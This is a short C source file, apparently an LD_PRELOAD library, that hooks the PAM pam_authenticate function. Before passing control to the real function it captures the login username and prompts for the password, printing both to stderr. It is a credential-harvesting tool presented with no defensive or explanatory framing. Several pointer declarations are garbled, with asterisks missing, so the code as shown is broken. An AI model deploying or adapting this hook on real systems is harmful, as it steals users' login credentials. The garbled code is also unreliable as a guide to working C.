#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

typedef int (pam_authenticate_t)(pam_handle_t, int);

void get_username(pam_handle_t pamh) {
    const charusername = NULL;

    if (pam_get_item(pamh, PAM_USER, (const void )&username) == PAM_SUCCESS && username) {
        fprintf(stderr, "USER =>>>>> %s\n", username);

    } else {
        perror("Failed to retrieve username");
    }
}


void get_password(pam_handle_t pamh) {
    struct pam_convconv;

    if (pam_get_item(pamh, PAM_CONV, (const void )&conv) == PAM_SUCCESS && conv) {
        const struct pam_message msg = {
            .msg_style = PAM_PROMPT_ECHO_OFF,
            .msg = "Password: "
        };
        const struct pam_message msgp = &msg;
        struct pam_responseresp = NULL;

        int ret = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
        if (ret == PAM_SUCCESS && resp && resp->resp) {
            fprintf(stderr, "PASSWORD =>>>>>: %s\n", resp->resp);

            free(resp->resp);
            free(resp);
        } else {
            perror("Failed to retrieve password1");
        }
    } else {
        perror("Failed to retrieve password2");
    }
}

int pam_authenticate(pam_handle_t *pamh, int flags) {
    static pam_authenticate_t original_pam_authenticate = NULL;

    if (!original_pam_authenticate) {
        original_pam_authenticate = (pam_authenticate_t)dlsym(RTLD_NEXT, "pam_authenticate");
        if (!original_pam_authenticate) {
            fprintf(stderr, "Error loading original pam_authenticate: %s\n", dlerror());
            exit(EXIT_FAILURE);
        }
    }

    get_username(pamh);
    get_password(pamh);

    return original_pam_authenticate(pamh, flags);
}
